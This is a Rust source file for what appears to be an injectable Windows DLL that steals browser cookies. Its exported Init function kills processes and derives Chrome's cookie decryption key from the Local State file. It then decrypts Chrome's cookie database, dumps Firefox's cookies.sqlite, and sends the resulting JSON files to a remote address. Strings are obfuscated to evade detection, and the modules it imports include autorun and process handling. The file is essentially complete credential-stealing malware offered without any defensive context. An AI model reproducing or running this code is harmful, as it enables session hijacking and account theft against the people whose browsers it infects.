mod autorun;
mod chrome_cookies;
mod chrome_decoder;
mod file_operator;
mod firefox_cookies;
mod import_libs;
mod process_handle;
mod sendfile;
mod zipfile;

extern crate base64;

use crate::chrome_cookies::ChromeCookies;
use crate::chrome_decoder::*;
use crate::file_operator::*;
use crate::firefox_cookies::*;
use crate::import_libs::*;
use crate::process_handle::*;
use crate::sendfile::*;
use crate::zipfile::*;
use goldberg::goldberg_string;
use std::ffi::c_void;
use std::fs::File;
use std::io::{Read, Write};
use std::process::exit;
use std::ptr::null_mut;
use std::thread::sleep;
use std::time::Duration;
use std::{fs, thread};

#[no_mangle]
pub extern "C" fn Init() {
    unsafe {
        let handle = thread::spawn(|| {
            kill_process();
            let mut file_names: Vec<String> = Vec::new();
            let chrome_key_path = get_file_path(
                goldberg_string!("\\Google\\Chrome"),
                goldberg_string!("\\User Data\\Local State"),
                CSIDL_LOCAL_APPDATA,
            );
            let mut json_key_buffer_size: u32 = 0;
            let mut json_key_buffer: *mut c_void = null_mut();
            let mut contents = String::new();
            let result = File::open(chrome_key_path);
            if result.is_ok() {
                let mut file = result.unwrap();
                json_key_buffer_size = file.read_to_string(&mut contents).unwrap() as u32;
                json_key_buffer = contents.as_mut_ptr() as *mut c_void;
            }
            if json_key_buffer_size != 0 {
                let mut chrome_decoder = ChromeDecoder::new();
                chrome_decoder.generate_key(json_key_buffer, json_key_buffer_size);

                let chrome_cookies_path = get_file_path(
                    goldberg_string!("\\Google\\Chrome"),
                    goldberg_string!("\\User Data\\Default\\Network\\Cookies"),
                    CSIDL_LOCAL_APPDATA,
                );
                let mut chrome_cookies = ChromeCookies::new(chrome_cookies_path.as_str());
                let result = chrome_cookies
                    .query_sqlite(chrome_decoder.key_handle, goldberg_string!("chrome.json"));
                if (result.is_ok()) {
                    file_names.push(String::from(goldberg_string!("chrome.json")));
                }
            }
            sleep(Duration::from_secs(2));

            let firefox_path = get_file_path(
                goldberg_string!("\\Mozilla\\Firefox"),
                goldberg_string!("\\Profiles"),
                CSIDL_APPDATA,
            );
            let firefox_cookies_path =
                search_file(firefox_path.as_str(), goldberg_string!("cookies.sqlite"));
            if firefox_cookies_path != None {
                let firefox = FirefoxCookies::new(firefox_cookies_path.unwrap().as_str());
                let result = firefox.query_sqlite();
                if result.is_ok() {
                    file_names.push(String::from(goldberg_string!("firefox.json")));
                }
            }
            // let passwd = create_random_filename(8);
            // let zip_name = format!("{}.zip", passwd);
            //
            // let result = zipfile(file_names, zip_name.as_str(), "default");
            //
            // let zip_name_tmp = format!("{}.zip", passwd);
            // if result.is_err() {
            //     exit(-1);
            // }

            for file_name in &file_names {
                send_file_ip(String::from(file_name));
            }

            //send_file_ip(String::from(goldberg_string!("firefox.json")));


            sleep(Duration::from_millis(500));

        });
        handle.join().unwrap();
    }
}
